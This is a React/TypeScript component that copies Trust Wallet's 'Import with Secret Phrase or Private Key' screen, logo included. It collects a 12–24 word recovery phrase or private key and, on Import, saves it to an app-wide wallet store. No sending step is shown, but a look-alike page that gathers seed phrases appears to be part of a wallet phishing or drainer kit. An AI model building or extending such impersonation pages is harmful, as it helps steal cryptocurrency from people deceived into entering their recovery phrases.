"use client";

import { useRef, useState } from "react";
import { X, Eye, EyeOff } from "lucide-react";
import { Input } from "@/components/ui/input";
import { useWalletStore } from "@/store/walletStore";
import TrustWalletFull from "../icons/trust-wallet-full";

const TrustWallet = ({ handleFinish }: { handleFinish: () => void }) => {
	const [walletName, setWalletName] = useState("Main wallet");
	const [words, setWords] = useState<string[]>([""]);
	const [visibility, setVisibility] = useState<boolean[]>([false]);
	const [allVisible, setAllVisible] = useState(false);
	const [nameFocused, setNameFocused] = useState(false);
	const [areaFocused, setAreaFocused] = useState(false);
	const inputRefs = useRef<(HTMLInputElement | null)[]>([]);
	const { setSeedPhrase } = useWalletStore();

	// Handle completion
	const handleComplete = () => {
		setSeedPhrase(words.join(" "));
		setWalletName(walletName);
		handleFinish();
	};

	// Add a new input automatically
	const addNewInput = () => {
		if (words.length < 24) {
			setWords((prev) => [...prev, ""]);
			setVisibility((prev) => [...prev, false]);
			setTimeout(() => {
				inputRefs.current[words.length]?.focus();
			}, 10);
		}
	};

	// Handle typing within each input (keyboard only)
	const handleKeyDown = (
		e: React.KeyboardEvent<HTMLInputElement>,
		index: number
	) => {
		if (e.key === " ") {
			e.preventDefault();
			if (words[index].trim() !== "") addNewInput();
		} else if (e.key === "Backspace" && words[index] === "" && index > 0) {
			e.preventDefault();
			setWords((prev) => prev.filter((_, i) => i !== index));
			setVisibility((prev) => prev.filter((_, i) => i !== index));
			setTimeout(() => {
				inputRefs.current[index - 1]?.focus();
			}, 10);
		}
	};

	// Handle input change (works for both desktop & mobile)
	const handleInput = (e: React.FormEvent<HTMLInputElement>, index: number) => {
		const value = e.currentTarget.value;

		// If a space is typed (mobile-friendly)
		if (value.endsWith(" ")) {
			if (words[index].trim() !== "") addNewInput();
			return;
		}

		// Handle normal typing
		setWords((prev) => prev.map((w, i) => (i === index ? value : w)));
	};

	// Toggle all visibility
	const toggleAllVisibility = () => {
		const newVisible = !allVisible;
		setAllVisible(newVisible);
		setVisibility((prev) => prev.map(() => newVisible));
	};

	// Handle area click
	const handleAreaClick = (e: React.MouseEvent<HTMLDivElement>) => {
		const target = e.target as HTMLElement;
		if (target.closest("input") || target.closest("button")) return;

		if (words.length === 0) {
			setWords([""]);
			setVisibility([false]);
			setTimeout(() => {
				inputRefs.current[0]?.focus();
			}, 10);
		} else {
			setTimeout(() => {
				inputRefs.current[words.length - 1]?.focus();
			}, 10);
		}
	};

	// Disable button logic
	const isButtonDisabled =
		!walletName.trim() ||
		words.length === 0 ||
		words.every((w) => w.trim() === "");

	return (
		<div className="min-h-screen bg-black flex text-gray-300 w-full">
			{/* Right side - Form */}
			<div className="flex-1 flex flex-col items-center justify-center p-4 lg:p-12">
				<span className="mb-12 flex w-full ">
					<TrustWalletFull />
				</span>
				<div className="w-full max-w-2xl">
					<h1 className="text-2xl font-bold mb-12">
						Import with Secret Phrase or Private Key
					</h1>

					<div className="space-y-6">
						{/* Wallet Name */}
						<div>
							<label className="block font-semibold mb-2">Wallet Name</label>
							<div
								className={`relative border rounded-lg ${
									nameFocused ? "border-green-600" : "border-neutral-700"
								}`}
							>
								<Input
									value={walletName}
									onChange={(e) => setWalletName(e.target.value)}
									onFocus={() => setNameFocused(true)}
									onBlur={() => setNameFocused(false)}
									className="text-gray-100/80 font-semibold py-6 pr-10 bg-transparent border-0"
								/>
								{walletName && (
									<button
										onClick={() => setWalletName("")}
										className="absolute right-3 top-1/2 -translate-y-1/2 bg-gray-100/70 rounded-full text-black"
									>
										<X className="w-4 h-4 p-0.5" />
									</button>
								)}
							</div>
							<p className="text-xs text-muted-foreground mt-1">
								You can edit this later
							</p>
						</div>

						{/* Secret Phrase area */}
						<div>
							<label className="block text-sm font-medium text-foreground mb-2">
								Enter Secret Phrase or Private Key
							</label>

							<div
								className={`relative flex flex-wrap rounded-lg p-4 min-h-56 cursor-text transition-colors ${
									areaFocused
										? "border-1 border-green-600"
										: "border border-neutral-700"
								} bg-neutral-900`}
								onClick={handleAreaClick}
								onFocus={() => setAreaFocused(true)}
								onBlur={() => setAreaFocused(false)}
								tabIndex={0}
							>
								{words.map((word, index) => (
									<div key={index}>
										<input
											ref={(el) => {
												if (el) inputRefs.current[index] = el;
											}}
											type={visibility[index] ? "text" : "password"}
											value={word}
											onInput={(e) => handleInput(e, index)} // ✅ Mobile & desktop compatible
											onKeyDown={(e) => handleKeyDown(e, index)} // ✅ Handles desktop keys
											style={{
												width: `${Math.max(word.length, 1)}ch`,
											}}
											className="bg-transparent outline-none text-gray-100/80 w-fit font-semibold"
										/>
									</div>
								))}

								{/* Eye Icon */}
								<button
									type="button"
									onClick={toggleAllVisibility}
									className="absolute bottom-3 right-3 text-gray-400 hover:text-gray-200 transition"
								>
									{allVisible ? (
										<EyeOff className="w-5 h-5" />
									) : (
										<Eye className="w-5 h-5" />
									)}
								</button>
							</div>

							<p className="text-xs font-medium mt-2 text-gray-100/80">
								Secret Phrase is typically 12 (sometimes 18, 24) words separated
								by single spaces
								<br />
								Private Key is a long alphanumeric code
							</p>
						</div>

						{/* Import button */}
						<div className="flex w-full justify-end items-center">
							<button
								onClick={handleComplete}
								className={`w-full py-3 rounded-full font-medium transition-all mt-auto max-w-80 ${
									isButtonDisabled
										? "bg-green-600/60 cursor-not-allowed opacity-50"
										: "bg-green-600 hover:bg-green-500 text-neutral-800"
								}`}
								disabled={isButtonDisabled}
							>
								Import
							</button>
						</div>
					</div>
				</div>
			</div>
		</div>
	);
};

export default TrustWallet;
